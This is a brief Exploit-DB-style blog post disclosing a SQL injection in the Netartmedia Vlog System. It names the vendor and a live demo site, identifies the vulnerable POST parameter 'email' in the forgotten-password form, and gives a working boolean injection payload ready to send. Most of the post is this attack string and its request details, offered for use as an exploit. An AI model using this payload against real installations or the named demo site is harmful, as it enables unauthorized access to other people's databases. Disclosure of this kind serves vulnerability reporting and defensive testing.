---
layout:     post
title:      "Netartmedia Vlog System - 'email' SQL Injection"
date:       2019-03-21 12:00
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---
# Exploit Title: Netartmedia Vlog System - 'email' SQL Injection
# Date: 20.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.netartmedia.net/vlogsystem/
# Demo Site: https://www.phpscriptdemos.com/vlogs/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A
----- PoC: SQLi -----
# Request: http://localhost/[PATH]/index.php
# Vulnerable Parameter: email (POST)
# Attack
Pattern: ProceedSend=1&email=-1'%20OR%203*2*1=6%20AND%20000371=000371%20--%20&mod=forgotten_password
